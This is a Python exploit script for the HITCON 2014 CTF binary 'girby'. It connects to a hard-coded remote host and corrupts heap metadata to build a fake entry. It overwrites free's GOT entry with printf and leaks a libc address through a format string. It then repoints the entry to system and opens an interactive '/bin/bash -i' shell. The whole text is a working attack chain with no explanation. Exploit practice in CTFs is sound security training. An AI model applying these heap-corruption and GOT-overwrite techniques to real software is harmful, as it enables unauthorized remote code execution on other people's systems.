__author__ = 'HuyNA'
'''
girby
Description
https://raw.githubusercontent.com/hitcon2014ctf/ctf/master/girby-86c7d5a294f9b8d67b2dc614ff143b70
https://dl.dropbox.com/s/ucgye5aroyqtswg/girby-86c7d5a294f9b8d67b2dc614ff143b70

Hint
'''

#!/usr/bin/python
import struct
import socket
import telnetlib

def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def p(v):
    return struct.pack('<Q', v)

def u(v):
    return struct.unpack('<Q', v)[0]

def write_entry(f, index, data):
    f.write('2\n')
    f.write(str(index) + '\n')
    f.write(str(len(data)) + '\n')
    f.write(data)
    assert f.readline().strip() == 'OK'

def free_entry(f, index):
    f.write('3\n')
    f.write(str(index) + '\n')
    assert f.readline().strip() == 'OK'

def printf_entry(f, index, delim='END\n'):
    f.write('3\n')
    f.write(str(index) + '\n')
    resp = readuntil(f, delim)[:-len(delim)]
    assert f.readline().strip() == 'OK'
    return resp

def do_system(f, index, cmd):
    write_entry(f, index, cmd + '\0')
    f.write('3\n')
    f.write(str(index) + '\n')

def do_printf(f, index, fmt):
    write_entry(f, index, fmt + 'END\n\0')
    return printf_entry(f, index)

def allocate_entry(f, length):
    f.write('1\n')
    f.write(str(length) + '\n')
    index = int(f.readline())
    assert f.readline().strip() == 'OK'
    return index

def strlen_entry(f, index):
    f.write('4\n')
    f.write(str(index) + '\n')
    msg = f.readline().strip()
    assert f.readline().strip() == 'OK'
    return msg

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.64.45.35', 3573))
f = s.makefile('rw', bufsize=0)

free_got = 0x602018
printf = 0x4007A0
fake_entry = 0x602100 - 8

raw_input()
entries = []
for i in xrange(0x30):
    entries.append(allocate_entry(f, 32))
    print entries[-1]

free_entry(f, entries[-1])

overwrite = 'A' * 32
overwrite += p(0)
overwrite += p(0x31)
overwrite += p(fake_entry)
write_entry(f, entries[-2], overwrite)
e0 = allocate_entry(f, 32)

raw_input()
e = allocate_entry(f, 32)
print 'Got memory:', e

overwrite = 'A' * 56
overwrite += p(free_got)
write_entry(f, e, overwrite)
write_entry(f, 0, p(printf))

libc_start_main = int(do_printf(f, 50, '%41$p'), 16)
print hex(libc_start_main)
libc_base = libc_start_main - 0x21ec5
print 'libc_base =', hex(libc_base)
system = libc_base + 0x46900

write_entry(f, 0, p(system))
do_system(f, 4, '/bin/bash -i')

t = telnetlib.Telnet()
t.sock = s
t.interact()